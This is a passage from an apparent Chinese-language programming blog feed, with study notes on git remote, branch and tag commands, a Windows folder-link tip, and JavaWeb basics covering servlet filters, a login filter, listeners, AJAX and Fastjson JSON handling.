remote  -v  <br><span class="hljs-meta prompt_"># </span><span class="language-bash">查看远程仓库详细地址</span><br>git remote show  &lt;仓库简称&gt;<br><br></code></pre></td></tr></table></figure><h4 id="2-2、添加-移除远测仓库"><a href="#2-2、添加-移除远测仓库" class="headerlink" title="2.2、添加/移除远测仓库"></a>2.2、添加/移除远测仓库</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">添加远程仓库</span><br>git remote add &lt;shortname&gt; &lt;url&gt;<br><span class="hljs-meta prompt_"># </span><span class="language-bash">移除远程仓库和本地仓库的关系(只是从本地移除远程仓库的关联关系，并不会真正影响到远程仓库)</span><br>git remote rm &lt;shortname&gt; <br></code></pre></td></tr></table></figure><h4 id="2-3、从远程仓库获取代码"><a href="#2-3、从远程仓库获取代码" class="headerlink" title="2.3、从远程仓库获取代码"></a>2.3、从远程仓库获取代码</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">从远程仓库克隆</span><br>git clone &lt;url&gt; <br><span class="hljs-meta prompt_"># </span><span class="language-bash">从远程仓库拉取 (拉取到.git 目录,不会合并到工作区,工作区发生变化)</span><br>git fetch  &lt;shortname&gt;  &lt;分支名称&gt;<br><span class="hljs-meta prompt_"># </span><span class="language-bash">手动合并  把某个版本的某个分支合并到当前工作区</span><br>git merge &lt;shortname&gt;/&lt;分支名称&gt;<br><span class="hljs-meta prompt_"># </span><span class="language-bash">从远程仓库拉取 (拉取到.git 目录,合并到工作区,工作区不发生变化) = fetch+merge</span><br>git pull  &lt;shortname&gt;  &lt;分支名称&gt;<br>git pull  &lt;shortname&gt;  &lt;分支名称&gt;  --allow-unrelated-histories  #  强制拉取合并<br></code></pre></td></tr></table></figure><p>注意：如果当前本地仓库不是从远程仓库克隆，而是本地创建的仓库，并且仓库中存在文件，此时再从远程仓库拉取文件的时候会报错（fatal: refusing to merge unrelated histories ），解决此问题可以在git pull命令后加入参数–allow-unrelated-histories (如上 命令)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">将本地仓库推送至远程仓库的某个分支</span><br>git push [remote-name] [branch-name]<br></code></pre></td></tr></table></figure><h3 id="3、命令行–-分支"><a href="#3、命令行–-分支" class="headerlink" title="3、命令行– 分支"></a>3、命令行– 分支</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">默认 分支名称为 master</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">列出所有本地分支</span><br>git branch<br><span class="hljs-meta prompt_"># </span><span class="language-bash">列出所有远程分支</span><br>git branch -r<br><span class="hljs-meta prompt_"># </span><span class="language-bash">列出所有本地分支和远程分支</span><br>git branch -a<br><span class="hljs-meta prompt_"># </span><span class="language-bash">创建分支</span><br>git branch &lt;分支名&gt;<br><span class="hljs-meta prompt_"># </span><span class="language-bash">切换分支</span> <br>git checkout &lt;分支名&gt;<br><span class="hljs-meta prompt_"># </span><span class="language-bash">删除分支(如果分支已经修改过,则不允许删除)</span><br>git branch -d  &lt;分支名&gt;<br><span class="hljs-meta prompt_"># </span><span class="language-bash">强制删除分支</span><br>git branch -D  &lt;分支名&gt;<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">提交分支至远程仓库</span><br>git push &lt;仓库简称&gt; &lt;分支名称&gt;<br><span class="hljs-meta prompt_"># </span><span class="language-bash">合并分支 将其他分支合并至当前工作区</span><br>git merge &lt;分支名称&gt;<br><span class="hljs-meta prompt_"># </span><span class="language-bash">删除远程仓库分支</span><br>git push origin –d branchName<br></code></pre></td></tr></table></figure><h3 id="4、命令行-–tag"><a href="#4、命令行-–tag" class="headerlink" title="4、命令行 –tag"></a>4、命令行 –tag</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">列出所有tag</span><br>git tag<br><span class="hljs-meta prompt_"># </span><span class="language-bash">查看tag详细信息</span> <br>git show [tagName]<br><span class="hljs-meta prompt_"># </span><span class="language-bash">新建一个tag</span><br>git tag [tagName]<br><span class="hljs-meta prompt_"># </span><span class="language-bash">提交指定tag</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">git push [仓库简称] [tagName]</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">新建一个分支，指向某个tag</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">git checkout -b [branch] [tag]</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">删除本地tag</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">git tag -d [tag]</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">删除远程tag (注意 空格)</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">git push origin :refs/tags/[tag]</span><br></code></pre></td></tr></table></figure><h2 id="五、相关软件配置和使用git"><a href="#五、相关软件配置和使用git" class="headerlink" title="五、相关软件配置和使用git"></a>五、相关软件配置和使用git</h2><h3 id="1、intellij"><a href="#1、intellij" class="headerlink" title="1、intellij"></a>1、intellij</h3><h3 id="2、VS-Code"><a href="#2、VS-Code" class="headerlink" title="2、VS Code"></a>2、VS Code</h3>]]></content>
    
    
    <categories>
      
      <category>Git</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Git</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JavaWeb基础1-项目实践1</title>
    <link href="/2023/05/21/JavaWeb_1_3/"/>
    <url>/2023/05/21/JavaWeb_1_3/</url>
    
    <content type="html"><![CDATA[<h1 id="JavaWeb基础1-项目实践1"><a href="#JavaWeb基础1-项目实践1" class="headerlink" title="JavaWeb基础1-项目实践1"></a>JavaWeb基础1-项目实践1</h1><h2 id="一、综合案例1（一个数据库表页面）"><a href="#一、综合案例1（一个数据库表页面）" class="headerlink" title="一、综合案例1（一个数据库表页面）"></a>一、综合案例1（一个数据库表页面）</h2><p>代码已开源</p><p>github：</p><p><a href="https://github.com/PennDavid/MyJavaLearnHub">https://github.com/PennDavid/MyJavaLearnHub</a></p><p>gitee：</p><p><a href="https://gitee.com/penndavid/MyJavaLearnHub">https://gitee.com/penndavid/MyJavaLearnHub</a></p><h2 id="二、其他小实践"><a href="#二、其他小实践" class="headerlink" title="二、其他小实践"></a>二、其他小实践</h2><h3 id="1、验证码"><a href="#1、验证码" class="headerlink" title="1、验证码"></a>1、验证码</h3><h3 id="2、表格"><a href="#2、表格" class="headerlink" title="2、表格"></a>2、表格</h3>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
      <category>JavaWeb</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JavaWeb</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2305-实用小技巧1</title>
    <link href="/2023/05/19/2305-tip1/"/>
    <url>/2023/05/19/2305-tip1/</url>
    
    <content type="html"><![CDATA[<h1 id="2305-实用小技巧1"><a href="#2305-实用小技巧1" class="headerlink" title="2305-实用小技巧1"></a>2305-实用小技巧1</h1><h2 id="1、建立文件夹映射"><a href="#1、建立文件夹映射" class="headerlink" title="1、建立文件夹映射"></a>1、建立文件夹映射</h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">mklink /d &quot;C:/A&quot; &quot;C:/B/A&quot;<br></code></pre></td></tr></table></figure><p>第一个：(eg: C:/A)：要建立映射的地址（会在资源管理器创建/显示一个文件夹）</p><p>第二个：(eg: C:/B/A)：映射到的文件夹地址</p><p>注意：必须加””</p><p>相关知识链接：<a href="https://blog.csdn.net/qq_52102933/article/details/126792094">https://blog.csdn.net/qq_52102933/article/details/126792094</a></p>]]></content>
    
    
    <categories>
      
      <category>Tips</category>
      
      <category>Windows</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Tips</tag>
      
      <tag>Windows</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JavaWeb基础1-2</title>
    <link href="/2023/05/18/JavaWeb_1_2/"/>
    <url>/2023/05/18/JavaWeb_1_2/</url>
    
    <content type="html"><![CDATA[<h1 id="JavaWeb基础1-2"><a href="#JavaWeb基础1-2" class="headerlink" title="JavaWeb基础1-2"></a>JavaWeb基础1-2</h1><h2 id="八、Filter"><a href="#八、Filter" class="headerlink" title="八、Filter"></a>八、Filter</h2><p>概念：FiIter表示过滤器，是 JavaWeb三大组件(Servlet、Filter、Listener)之一<br>过滤器可以把对资源的请求拦截下来，从而实现一些特殊的功能。<br>过滤器一般完成一些通用的操作，比如：权限控制、统一编码处理、敏感字符处理等等</p><p><img src="/img/JavaWeb/1-2/Filter1.png"></p><h3 id="1、入门"><a href="#1、入门" class="headerlink" title="1、入门"></a>1、入门</h3><p>Filter类的案例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@WebFilter(&quot;/*&quot;)</span><br><span class="hljs-comment">//配置的拦截资源的路径</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 拦截具体的资源：/index.jsp: 只有访问 index.jsp 时才会被拦截</span><br><span class="hljs-comment"> * 目录拦截：     /user/*   : 访问 /use 下的所有资源都会被拦截</span><br><span class="hljs-comment"> * 后缀名拦截：   *.jsp     : 访问后缀名为 jsp 的资源，都会被拦截</span><br><span class="hljs-comment"> * 拦截所有 ：    /*        : 访问所有资源，都会被拦截</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FilterDemo</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Filter</span> &#123;<br>    <span class="hljs-comment">//实现Filter接口，重写方法</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(FilterConfig filterConfig)</span> <span class="hljs-keyword">throws</span> ServletException &#123;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>        <span class="hljs-comment">//放行前代码，一般对request数据进行处理</span><br>        System.out.println(<span class="hljs-string">&quot;1---FilterDemo doFilter---&quot;</span>);<br>        <span class="hljs-comment">//放行</span><br>        filterChain.doFilter(servletRequest,servletResponse);<br>        <span class="hljs-comment">//放行后会访问资源</span><br>        <span class="hljs-comment">//放行后代码，一般对response数据进行处理</span><br>        System.out.println(<span class="hljs-string">&quot;2---FilterDemo doFilter---&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="2、Filter链"><a href="#2、Filter链" class="headerlink" title="2、Filter链"></a>2、Filter链</h3><p>多个Filter过滤器</p><p>注解配置的 Filter，优先级按照过滤器类名（字符串）的自然排序</p><p><img src="/img/JavaWeb/1-2/Filter2.png"></p><h3 id="3、登录案例"><a href="#3、登录案例" class="headerlink" title="3、登录案例"></a>3、登录案例</h3><p><img src="/img/JavaWeb/1-2/Filter3.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@WebFilter(&quot;/*&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LoginFilter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Filter</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(FilterConfig filterConfig)</span> <span class="hljs-keyword">throws</span> ServletException &#123;<br><br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>        <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">httpreq</span> <span class="hljs-operator">=</span> (HttpServletRequest) servletRequest;<br>        <span class="hljs-comment">//0-1.排除登录相关资源</span><br>        String urls[] = &#123;<span class="hljs-string">&quot;login.jsp&quot;</span>,<span class="hljs-string">&quot;/loginServlet&quot;</span>,<span class="hljs-string">&quot;/css/&quot;</span>,<span class="hljs-string">&quot;/js/&quot;</span>,<span class="hljs-string">&quot;/fonts/&quot;</span>,<span class="hljs-string">&quot;/checkCodeServlet&quot;</span>&#125;;<br>        <span class="hljs-comment">//0-2.获取请求路径</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> httpreq.getRequestURI().toString();<br>        <span class="hljs-comment">//0-3.判断是否包含登录相关资源路径</span><br>        <span class="hljs-keyword">for</span> (String u : urls) &#123;<br>            <span class="hljs-keyword">if</span>(url.contains(u))&#123;<br>                <span class="hljs-comment">//包含，放行</span><br>                filterChain.doFilter(servletRequest,servletResponse);<br>                <span class="hljs-keyword">return</span>;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-comment">//1.判断session中是否有登录用户信息</span><br>        <span class="hljs-type">HttpSession</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> httpreq.getSession();<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> session.getAttribute(<span class="hljs-string">&quot;user&quot;</span>);<br><br>        <span class="hljs-comment">//2.判断是否有登录信息</span><br>        <span class="hljs-keyword">if</span>(user == <span class="hljs-literal">null</span>)&#123;<br>            <span class="hljs-comment">//没有登录，跳转到登录页面</span><br>            httpreq.setAttribute(<span class="hljs-string">&quot;login_msg&quot;</span>,<span class="hljs-string">&quot;您尚未登录，请登录&quot;</span>);<br>            httpreq.getRequestDispatcher(<span class="hljs-string">&quot;/login.jsp&quot;</span>).forward(servletRequest,servletResponse);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-comment">//已经登录，放行</span><br>            filterChain.doFilter(servletRequest,servletResponse);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="九、Listener"><a href="#九、Listener" class="headerlink" title="九、Listener"></a>九、Listener</h2><p>概念：Listener 表示监听器，是 JavaWeb 三大组件 (ServIets、FiIter、Listener) 之一</p><p>监听器可以监听就是在application,session,request三个对象创建、销毁或者往其中添加修改删除属性时自动执行到代码的功能组件<br>Listener 分类： JavaWeb 中提供了 8 个监听器</p><p><img src="/img/JavaWeb/1-2/Listener1.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ListenerDemo</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ServletContextListener</span> &#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">contextInitialized</span><span class="hljs-params">(ServletContextEvent servletContextEvent)</span> &#123;<br>        <span class="hljs-comment">//加载资源</span><br>        System.out.println(<span class="hljs-string">&quot;ListenerDemo contextInitialized...&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">contextDestroyed</span><span class="hljs-params">(ServletContextEvent servletContextEvent)</span> &#123;<br>        <span class="hljs-comment">//释放资源</span><br>        System.out.println(<span class="hljs-string">&quot;ListenerDemo contextDestroyed...&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="十、AJAX"><a href="#十、AJAX" class="headerlink" title="十、AJAX"></a>十、AJAX</h2><h3 id="1、概念"><a href="#1、概念" class="headerlink" title="1、概念"></a>1、概念</h3><p>AJAX(Asynchronous JavaScript And XML)：异步的 JavaScript 和 XML</p><h3 id="2、作用"><a href="#2、作用" class="headerlink" title="2、作用"></a>2、作用</h3><p>1.与服务器进行数据交换 ： 通过 AJAX 可以给服务器发送请求，并获取服务器响应的数据</p><p>使用了 AJAX 和服务器进行通信，就可以使用 HTML+AJAX 来替换 JSP 页面了</p><p>2.异步交互：可以在不重新加载整个页面的情况下，与服务器交换数据并更新部分网页的技术，如：搜索联想、用户名是否可用校验，等等 </p><p>3.同步和异步</p><p><img src="/img/JavaWeb/1-2/AJAX1.png"></p><h3 id="3、入门"><a href="#3、入门" class="headerlink" title="3、入门"></a>3、入门</h3><p> 服务端（后端）Demo：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@WebServlet(&quot;/ajaxServlet&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AjaxDemo</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        resp.getWriter().write(<span class="hljs-string">&quot;hello, ajax!&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>客户端（前端）Demo：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Title<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-comment">// 创建 XMLHttpRequest 对象</span></span><br><span class="language-javascript">    <span class="hljs-keyword">const</span> xhttp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();</span><br><span class="language-javascript"></span><br><span class="language-javascript">    xhttp.<span class="hljs-property">onreadystatechange</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">readyState</span>  == <span class="hljs-number">4</span> &amp;&amp; <span class="hljs-variable language_">this</span>.<span class="hljs-property">status</span> == <span class="hljs-number">200</span>) &#123;</span><br><span class="language-javascript">            <span class="hljs-title function_">alert</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">responseText</span>);</span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript">    &#125;;</span><br><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-comment">// 定义回调函数</span></span><br><span class="language-javascript">    xhttp.<span class="hljs-property">onload</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">        <span class="hljs-comment">// 您可以在这里使用数据</span></span><br><span class="language-javascript">    &#125;</span><br><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-comment">// 发送请求</span></span><br><span class="language-javascript">    xhttp.<span class="hljs-title function_">open</span>(<span class="hljs-string">&quot;GET&quot;</span>, <span class="hljs-string">&quot;http://localhost:8080//ajaxServlet&quot;</span>);</span><br><span class="language-javascript">    xhttp.<span class="hljs-title function_">send</span>();</span><br><span class="language-javascript"></span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="十一、JSON"><a href="#十一、JSON" class="headerlink" title="十一、JSON"></a>十一、JSON</h2><p>概念：JavaScript Object Notation。JavaScript 对象表示法</p><p>由于其语法简单，层次结构鲜明，现多用于作为数据载体，在网络中进行数据传输</p><h3 id="1、JSON概览与定义"><a href="#1、JSON概览与定义" class="headerlink" title="1、JSON概览与定义"></a>1、JSON概览与定义</h3><p><img src="/img/JavaWeb/1-2/JSON1.png"></p><p>简单定义：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Title<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">  <span class="hljs-keyword">var</span> json = &#123;</span><br><span class="language-javascript">    <span class="hljs-string">&quot;name&quot;</span> : <span class="hljs-string">&quot;zhangsan&quot;</span>,</span><br><span class="language-javascript">    <span class="hljs-string">&quot;age&quot;</span> : <span class="hljs-number">18</span>,</span><br><span class="language-javascript">    <span class="hljs-string">&quot;adde&quot;</span> : [<span class="hljs-string">&quot;beijing&quot;</span>,<span class="hljs-string">&quot;shanghai&quot;</span>,<span class="hljs-string">&quot;guangzhou&quot;</span>]</span><br><span class="language-javascript">  &#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="2、JSON和Java对象的相互转化"><a href="#2、JSON和Java对象的相互转化" class="headerlink" title="2、JSON和Java对象的相互转化"></a>2、JSON和Java对象的相互转化</h3><p>Fastjson是阿里巴巴提供的一个 Java 语言编写的高性能功能完善的 JSON 库 ， 是目前 Java 语言中最快的 JSON库，可以实现 Java 对象和 JSON 字符串的相互转换。</p><p>1、导入</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.alibaba<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>fastjson<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.2.83<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>2、Java对象与JSON对象转化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.penn.JSON;<br><br><span 